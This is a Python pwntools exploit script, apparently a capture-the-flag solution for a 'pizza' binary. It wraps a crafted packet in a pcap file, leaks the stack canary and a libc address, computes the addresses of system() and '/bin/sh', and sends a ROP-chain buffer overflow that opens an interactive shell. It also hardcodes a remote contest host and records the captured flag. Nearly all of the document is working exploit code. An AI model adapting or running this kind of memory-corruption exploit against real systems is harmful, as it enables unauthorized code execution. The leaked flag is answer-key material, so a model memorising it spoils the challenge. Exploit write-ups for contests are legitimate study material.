#!/usr/bin/env python2
from scapy.all import *
from pwn import *

context.arch = "amd64"

binary = ELF("pizza")

local = True
#local = False
if local:
    io = process("./pizza")
    libc = ELF("/usr/lib/libc.so.6")
    offset = 240
else:
    io = remote("166.111.132.132", 10002)
    libc = ELF("libc-2.19.so")
    offset = 245

binsh = libc.search("/bin/sh\x00").next()
payload = "AAAAAA" + p8(0x50)

pkt = IP(src="8.0.5.1", dst = "8.0.0.1")/TCP(dport=1286)/payload

wrpcap("temp.pcap", pkt)
fd = open("temp.pcap", "r")
pkt = fd.read()
fd.close()

io.sendlineafter(": ", str(len(pkt)))
io.sendlineafter("data\n", pkt)
io.sendlineafter(">> ", str(6))

io.recvuntil("<Payload>\n")
data = io.recvuntil("Menu:\n")

cookie = data[2382+48: 2382+48+24]
cookie = "".join(cookie.split(" ")).decode("hex")

libc_start = "".join(data[1820+2454:1820+2454+24].split(" ")).decode("hex")
libc_start = u64(libc_start)
print "[+] leak __libc_start_main address: ", hex(libc_start)

libc_base = libc_start - libc.symbols["__libc_start_main"] - offset
system_addr = libc_base + libc.symbols["system"]
binsh_addr = libc_base + binsh
print "[+] leak libc base address: ", hex(libc_base)
print "[+] leak system() address: ", hex(system_addr)

#0x0000000000402083 : pop rdi ; ret
g1 = 0x0000000000402083 

rop = ROP(binary)
rop.call(system_addr, (binsh_addr,))

print rop.dump()

#newpayload = "B"*(0x20-0x8) + cookie + "C" * 8  + p64(g1) + p64(binsh_addr) + p64(system_addr)
newpayload = "B"*(0x20-0x8) + cookie + "C" * 8  + rop.chain()
io.sendlineafter(">> ", str(5))
io.sendlineafter(": ", newpayload)

io.sendlineafter(">> ", str(7))

io.interactive()

#flag : f4643002-66c7-4418-96fd-70ef72dc0a8d
